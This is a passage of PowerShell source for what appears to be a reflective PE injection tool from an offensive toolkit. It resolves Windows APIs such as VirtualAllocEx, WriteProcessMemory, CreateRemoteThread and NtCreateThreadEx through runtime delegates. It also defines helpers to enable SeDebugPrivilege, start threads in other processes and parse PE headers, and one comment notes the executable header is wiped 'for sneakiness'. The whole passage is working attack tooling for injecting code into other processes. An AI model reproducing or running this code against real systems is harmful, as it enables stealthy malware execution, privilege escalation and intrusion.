		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOACCESS -Value 0x01
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READONLY -Value 0x02
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READWRITE -Value 0x04
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_WRITECOPY -Value 0x08
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE -Value 0x10
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READ -Value 0x20
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READWRITE -Value 0x40
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_WRITECOPY -Value 0x80
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOCACHE -Value 0x200
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_ABSOLUTE -Value 0
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_HIGHLOW -Value 3
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_DIR64 -Value 10
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_DISCARDABLE -Value 0x02000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_EXECUTE -Value 0x20000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_READ -Value 0x40000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_WRITE -Value 0x80000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_NOT_CACHED -Value 0x04000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_DECOMMIT -Value 0x4000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_EXECUTABLE_IMAGE -Value 0x0002
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_DLL -Value 0x2000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE -Value 0x40
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_NX_COMPAT -Value 0x100
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RELEASE -Value 0x8000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_QUERY -Value 0x0008
		$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_ADJUST_PRIVILEGES -Value 0x0020
		$Win32Constants | Add-Member -MemberType NoteProperty -Name SE_PRIVILEGE_ENABLED -Value 0x2
		$Win32Constants | Add-Member -MemberType NoteProperty -Name ERROR_NO_TOKEN -Value 0x3f0
		
		return $Win32Constants
	}

	Function Get-Win32Functions
	{
		$Win32Functions = New-Object System.Object
		
		$VirtualAllocAddr = Get-ProcAddress kernel32.dll VirtualAlloc
		$VirtualAllocDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		$VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualAlloc -Value $VirtualAlloc
		
		$VirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx
		$VirtualAllocExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		$VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocExAddr, $VirtualAllocExDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualAllocEx -Value $VirtualAllocEx
		
		$memcpyAddr = Get-ProcAddress msvcrt.dll memcpy
		$memcpyDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
		$memcpy = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memcpyAddr, $memcpyDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name memcpy -Value $memcpy
		
		$memsetAddr = Get-ProcAddress msvcrt.dll memset
		$memsetDelegate = Get-DelegateType @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
		$memset = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memsetAddr, $memsetDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name memset -Value $memset
		
		$LoadLibraryAddr = Get-ProcAddress kernel32.dll LoadLibraryA
		$LoadLibraryDelegate = Get-DelegateType @([String]) ([IntPtr])
		$LoadLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LoadLibraryAddr, $LoadLibraryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name LoadLibrary -Value $LoadLibrary
		
		$GetProcAddressAddr = Get-ProcAddress kernel32.dll GetProcAddress
		$GetProcAddressDelegate = Get-DelegateType @([IntPtr], [String]) ([IntPtr])
		$GetProcAddress = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressAddr, $GetProcAddressDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddress -Value $GetProcAddress
		
		$GetProcAddressIntPtrAddr = Get-ProcAddress kernel32.dll GetProcAddress #This is still GetProcAddress, but instead of PowerShell converting the string to a pointer, you must do it yourself
		$GetProcAddressIntPtrDelegate = Get-DelegateType @([IntPtr], [IntPtr]) ([IntPtr])
		$GetProcAddressIntPtr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressIntPtrAddr, $GetProcAddressIntPtrDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddressIntPtr -Value $GetProcAddressIntPtr
		
		$VirtualFreeAddr = Get-ProcAddress kernel32.dll VirtualFree
		$VirtualFreeDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
		$VirtualFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeAddr, $VirtualFreeDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualFree -Value $VirtualFree
		
		$VirtualFreeExAddr = Get-ProcAddress kernel32.dll VirtualFreeEx
		$VirtualFreeExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
		$VirtualFreeEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeExAddr, $VirtualFreeExDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualFreeEx -Value $VirtualFreeEx
		
		$VirtualProtectAddr = Get-ProcAddress kernel32.dll VirtualProtect
		$VirtualProtectDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
		$VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr, $VirtualProtectDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualProtect -Value $VirtualProtect
		
		$GetModuleHandleAddr = Get-ProcAddress kernel32.dll GetModuleHandleA
		$GetModuleHandleDelegate = Get-DelegateType @([String]) ([IntPtr])
		$GetModuleHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetModuleHandleAddr, $GetModuleHandleDelegate)
		$Win32Functions | Add-Member NoteProperty -Name GetModuleHandle -Value $GetModuleHandle
		
		$FreeLibraryAddr = Get-ProcAddress kernel32.dll FreeLibrary
		$FreeLibraryDelegate = Get-DelegateType @([IntPtr]) ([Bool])
		$FreeLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FreeLibraryAddr, $FreeLibraryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name FreeLibrary -Value $FreeLibrary
		
		$OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
	    $OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
	    $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name OpenProcess -Value $OpenProcess
		
		$WaitForSingleObjectAddr = Get-ProcAddress kernel32.dll WaitForSingleObject
	    $WaitForSingleObjectDelegate = Get-DelegateType @([IntPtr], [UInt32]) ([UInt32])
	    $WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingleObjectAddr, $WaitForSingleObjectDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name WaitForSingleObject -Value $WaitForSingleObject
		
		$WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory
        $WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value $WriteProcessMemory
		
		$ReadProcessMemoryAddr = Get-ProcAddress kernel32.dll ReadProcessMemory
        $ReadProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $ReadProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ReadProcessMemoryAddr, $ReadProcessMemoryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name ReadProcessMemory -Value $ReadProcessMemory
		
		$CreateRemoteThreadAddr = Get-ProcAddress kernel32.dll CreateRemoteThread
        $CreateRemoteThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateRemoteThreadAddr, $CreateRemoteThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name CreateRemoteThread -Value $CreateRemoteThread
		
		$GetExitCodeThreadAddr = Get-ProcAddress kernel32.dll GetExitCodeThread
        $GetExitCodeThreadDelegate = Get-DelegateType @([IntPtr], [Int32].MakeByRefType()) ([Bool])
        $GetExitCodeThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetExitCodeThreadAddr, $GetExitCodeThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetExitCodeThread -Value $GetExitCodeThread
		
		$OpenThreadTokenAddr = Get-ProcAddress Advapi32.dll OpenThreadToken
        $OpenThreadTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
        $OpenThreadToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenThreadTokenAddr, $OpenThreadTokenDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name OpenThreadToken -Value $OpenThreadToken
		
		$GetCurrentThreadAddr = Get-ProcAddress kernel32.dll GetCurrentThread
        $GetCurrentThreadDelegate = Get-DelegateType @() ([IntPtr])
        $GetCurrentThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetCurrentThreadAddr, $GetCurrentThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetCurrentThread -Value $GetCurrentThread
		
		$AdjustTokenPrivilegesAddr = Get-ProcAddress Advapi32.dll AdjustTokenPrivileges
        $AdjustTokenPrivilegesDelegate = Get-DelegateType @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
        $AdjustTokenPrivileges = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AdjustTokenPrivilegesAddr, $AdjustTokenPrivilegesDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name AdjustTokenPrivileges -Value $AdjustTokenPrivileges
		
		$LookupPrivilegeValueAddr = Get-ProcAddress Advapi32.dll LookupPrivilegeValueA
        $LookupPrivilegeValueDelegate = Get-DelegateType @([String], [String], [IntPtr]) ([Bool])
        $LookupPrivilegeValue = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LookupPrivilegeValueAddr, $LookupPrivilegeValueDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name LookupPrivilegeValue -Value $LookupPrivilegeValue
		
		$ImpersonateSelfAddr = Get-ProcAddress Advapi32.dll ImpersonateSelf
        $ImpersonateSelfDelegate = Get-DelegateType @([Int32]) ([Bool])
        $ImpersonateSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateSelfAddr, $ImpersonateSelfDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name ImpersonateSelf -Value $ImpersonateSelf
		
		# NtCreateThreadEx is only ever called on Vista and Win7. NtCreateThreadEx is not exported by ntdll.dll in Windows XP
        if (([Environment]::OSVersion.Version -ge (New-Object 'Version' 6,0)) -and ([Environment]::OSVersion.Version -lt (New-Object 'Version' 6,2))) {
		    $NtCreateThreadExAddr = Get-ProcAddress NtDll.dll NtCreateThreadEx
            $NtCreateThreadExDelegate = Get-DelegateType @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
            $NtCreateThreadEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NtCreateThreadExAddr, $NtCreateThreadExDelegate)
		    $Win32Functions | Add-Member -MemberType NoteProperty -Name NtCreateThreadEx -Value $NtCreateThreadEx
        }
		
		$IsWow64ProcessAddr = Get-ProcAddress Kernel32.dll IsWow64Process
        $IsWow64ProcessDelegate = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])
        $IsWow64Process = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IsWow64ProcessAddr, $IsWow64ProcessDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name IsWow64Process -Value $IsWow64Process
		
		$CreateThreadAddr = Get-ProcAddress Kernel32.dll CreateThread
        $CreateThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])
        $CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateThreadAddr, $CreateThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name CreateThread -Value $CreateThread
		
		return $Win32Functions
	}
	#####################################

			
	#####################################
	###########    HELPERS   ############
	#####################################

	#Powershell only does signed arithmetic, so if we want to calculate memory addresses we have to use this function
	#This will add signed integers as if they were unsigned integers so we can accurately calculate memory addresses
	Function Sub-SignedIntAsUnsigned
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$Value1,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$Value2
		)
		
		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
		[Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			$CarryOver = 0
			for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
			{
				$Val = $Value1Bytes[$i] - $CarryOver
				#Sub bytes
				if ($Val -lt $Value2Bytes[$i])
				{
					$Val += 256
					$CarryOver = 1
				}
				else
				{
					$CarryOver = 0
				}
				
				
				[UInt16]$Sum = $Val - $Value2Bytes[$i]

				$FinalBytes[$i] = $Sum -band 0x00FF
			}
		}
		else
		{
			Throw "Cannot subtract bytearrays of different sizes"
		}
		
		return [BitConverter]::ToInt64($FinalBytes, 0)
	}
	

	Function Add-SignedIntAsUnsigned
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$Value1,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$Value2
		)
		
		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
		[Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			$CarryOver = 0
			for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
			{
				#Add bytes
				[UInt16]$Sum = $Value1Bytes[$i] + $Value2Bytes[$i] + $CarryOver

				$FinalBytes[$i] = $Sum -band 0x00FF
				
				if (($Sum -band 0xFF00) -eq 0x100)
				{
					$CarryOver = 1
				}
				else
				{
					$CarryOver = 0
				}
			}
		}
		else
		{
			Throw "Cannot add bytearrays of different sizes"
		}
		
		return [BitConverter]::ToInt64($FinalBytes, 0)
	}
	

	Function Compare-Val1GreaterThanVal2AsUInt
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$Value1,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$Value2
		)
		
		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)

		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			for ($i = $Value1Bytes.Count-1; $i -ge 0; $i--)
			{
				if ($Value1Bytes[$i] -gt $Value2Bytes[$i])
				{
					return $true
				}
				elseif ($Value1Bytes[$i] -lt $Value2Bytes[$i])
				{
					return $false
				}
			}
		}
		else
		{
			Throw "Cannot compare byte arrays of different size"
		}
		
		return $false
	}
	

	Function Convert-UIntToInt
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[UInt64]
		$Value
		)
		
		[Byte[]]$ValueBytes = [BitConverter]::GetBytes($Value)
		return ([BitConverter]::ToInt64($ValueBytes, 0))
	}


    Function Get-Hex
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        $Value #We will determine the type dynamically
        )

        $ValueSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Value.GetType()) * 2
        $Hex = "0x{0:X$($ValueSize)}" -f [Int64]$Value #Passing a IntPtr to this doesn't work well. Cast to Int64 first.

        return $Hex
    }
	
	
	Function Test-MemoryRangeValid
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[String]
		$DebugString,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[IntPtr]
		$StartAddress,
		
		[Parameter(ParameterSetName = "Size", Position = 3, Mandatory = $true)]
		[IntPtr]
		$Size
		)
		
	    [IntPtr]$FinalEndAddress = [IntPtr](Add-SignedIntAsUnsigned ($StartAddress) ($Size))
		
		$PEEndAddress = $PEInfo.EndAddress
		
		if ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.PEHandle) ($StartAddress)) -eq $true)
		{
			Throw "Trying to write to memory smaller than allocated address range. $DebugString"
		}
		if ((Compare-Val1GreaterThanVal2AsUInt ($FinalEndAddress) ($PEEndAddress)) -eq $true)
		{
			Throw "Trying to write to memory greater than allocated address range. $DebugString"
		}
	}
	
	
	Function Write-BytesToMemory
	{
		Param(
			[Parameter(Position=0, Mandatory = $true)]
			[Byte[]]
			$Bytes,
			
			[Parameter(Position=1, Mandatory = $true)]
			[IntPtr]
			$MemoryAddress
		)
	
		for ($Offset = 0; $Offset -lt $Bytes.Length; $Offset++)
		{
			[System.Runtime.InteropServices.Marshal]::WriteByte($MemoryAddress, $Offset, $Bytes[$Offset])
		}
	}
	

	#Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
	Function Get-DelegateType
	{
	    Param
	    (
	        [OutputType([Type])]
	        
	        [Parameter( Position = 0)]
	        [Type[]]
	        $Parameters = (New-Object Type[](0)),
	        
	        [Parameter( Position = 1 )]
	        [Type]
	        $ReturnType = [Void]
	    )

	    $Domain = [AppDomain]::CurrentDomain
	    $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
	    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
	    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
	    $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	    $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
	    $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
	    $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
	    $MethodBuilder.SetImplementationFlags('Runtime, Managed')
	    
	    Write-Output $TypeBuilder.CreateType()
	}


	#Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
	Function Get-ProcAddress
	{
	    Param
	    (
	        [OutputType([IntPtr])]
	    
	        [Parameter( Position = 0, Mandatory = $True )]
	        [String]
	        $Module,
	        
	        [Parameter( Position = 1, Mandatory = $True )]
	        [String]
	        $Procedure
	    )

	    # Get a reference to System.dll in the GAC
	    $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
	        Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
	    $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
	    # Get a reference to the GetModuleHandle and GetProcAddress methods
	    $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
	    $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [reflection.bindingflags] "Public,Static", $null, [System.Reflection.CallingConventions]::Any, @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), $null);
	    # Get a handle to the module specified
	    $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
	    $tmpPtr = New-Object IntPtr
	    $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)

	    # Return the address of the function
	    Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
	}
	
	
	Function Enable-SeDebugPrivilege
	{
		Param(
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)
		
		[IntPtr]$ThreadHandle = $Win32Functions.GetCurrentThread.Invoke()
		if ($ThreadHandle -eq [IntPtr]::Zero)
		{
			Throw "Unable to get the handle to the current thread"
		}
		
		[IntPtr]$ThreadToken = [IntPtr]::Zero
		[Bool]$Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
		if ($Result -eq $false)
		{
			$ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if ($ErrorCode -eq $Win32Constants.ERROR_NO_TOKEN)
			{
				$Result = $Win32Functions.ImpersonateSelf.Invoke(3)
				if ($Result -eq $false)
				{
					Throw "Unable to impersonate self"
				}
				
				$Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
				if ($Result -eq $false)
				{
					Throw "Unable to OpenThreadToken."
				}
			}
			else
			{
				Throw "Unable to OpenThreadToken. Error code: $ErrorCode"
			}
		}
		
		[IntPtr]$PLuid = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.LUID))
		$Result = $Win32Functions.LookupPrivilegeValue.Invoke($null, "SeDebugPrivilege", $PLuid)
		if ($Result -eq $false)
		{
			Throw "Unable to call LookupPrivilegeValue"
		}

		[UInt32]$TokenPrivSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.TOKEN_PRIVILEGES)
		[IntPtr]$TokenPrivilegesMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenPrivSize)
		$TokenPrivileges = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenPrivilegesMem, [Type]$Win32Types.TOKEN_PRIVILEGES)
		$TokenPrivileges.PrivilegeCount = 1
		$TokenPrivileges.Privileges.Luid = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PLuid, [Type]$Win32Types.LUID)
		$TokenPrivileges.Privileges.Attributes = $Win32Constants.SE_PRIVILEGE_ENABLED
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($TokenPrivileges, $TokenPrivilegesMem, $true)

		$Result = $Win32Functions.AdjustTokenPrivileges.Invoke($ThreadToken, $false, $TokenPrivilegesMem, $TokenPrivSize, [IntPtr]::Zero, [IntPtr]::Zero)
		$ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() #Need this to get success value or failure value
		if (($Result -eq $false) -or ($ErrorCode -ne 0))
		{
			#Throw "Unable to call AdjustTokenPrivileges. Return value: $Result, Errorcode: $ErrorCode"   #todo need to detect if already set
		}
		
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPrivilegesMem)
	}
	
	
	Function Create-RemoteThread
	{
		Param(
		[Parameter(Position = 1, Mandatory = $true)]
		[IntPtr]
		$ProcessHandle,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[IntPtr]
		$StartAddress,
		
		[Parameter(Position = 3, Mandatory = $false)]
		[IntPtr]
		$ArgumentPtr = [IntPtr]::Zero,
		
		[Parameter(Position = 4, Mandatory = $true)]
		[System.Object]
		$Win32Functions
		)
		
		[IntPtr]$RemoteThreadHandle = [IntPtr]::Zero
		
		$OSVersion = [Environment]::OSVersion.Version
		#Vista and Win7
		if (($OSVersion -ge (New-Object 'Version' 6,0)) -and ($OSVersion -lt (New-Object 'Version' 6,2)))
		{
			#Write-Verbose "Windows Vista/7 detected, using NtCreateThreadEx. Address of thread: $StartAddress"
			$RetVal= $Win32Functions.NtCreateThreadEx.Invoke([Ref]$RemoteThreadHandle, 0x1FFFFF, [IntPtr]::Zero, $ProcessHandle, $StartAddress, $ArgumentPtr, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero)
			$LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if ($RemoteThreadHandle -eq [IntPtr]::Zero)
			{
				Throw "Error in NtCreateThreadEx. Return value: $RetVal. LastError: $LastError"
			}
		}
		#XP/Win8
		else
		{
			#Write-Verbose "Windows XP/8 detected, using CreateRemoteThread. Address of thread: $StartAddress"
			$RemoteThreadHandle = $Win32Functions.CreateRemoteThread.Invoke($ProcessHandle, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, $StartAddress, $ArgumentPtr, 0, [IntPtr]::Zero)
		}
		
		if ($RemoteThreadHandle -eq [IntPtr]::Zero)
		{
			Write-Error "Error creating remote thread, thread handle is null" -ErrorAction Stop
		}
		
		return $RemoteThreadHandle
	}

	

	Function Get-ImageNtHeaders
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[IntPtr]
		$PEHandle,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		$NtHeadersInfo = New-Object System.Object
		
		#Normally would validate DOSHeader here, but we did it before this function was called and then destroyed 'MZ' for sneakiness
		$dosHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PEHandle, [Type]$Win32Types.IMAGE_DOS_HEADER)

		#Get IMAGE_NT_HEADERS
		[IntPtr]$NtHeadersPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEHandle) ([Int64][UInt64]$dosHeader.e_lfanew))
		$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value $NtHeadersPtr
		$imageNtHeaders64 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS64)
		
		#Make sure the IMAGE_NT_HEADERS checks out. If it doesn't, the data structure is invalid. This should never happen.
	    if ($imageNtHeaders64.Signature -ne 0x00004550)
	    {
	        throw "Invalid IMAGE_NT_HEADER signature."
	    }
		
		if ($imageNtHeaders64.OptionalHeader.Magic -eq 'IMAGE_NT_OPTIONAL_HDR64_MAGIC')
		{
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders64
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $true
		}
		else
		{
			$ImageNtHeaders32 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS32)
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders32
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $false
		}
		
		return $NtHeadersInfo
	}


	#This function will get the information needed to allocated space in memory for the PE
	Function Get-PEBasicInfo
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true )]
		[Byte[]]
		$PEBytes,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		$PEInfo = New-Object System.Object
		
		#Write the PE to memory temporarily so I can get information from it. This is not it's final resting spot.
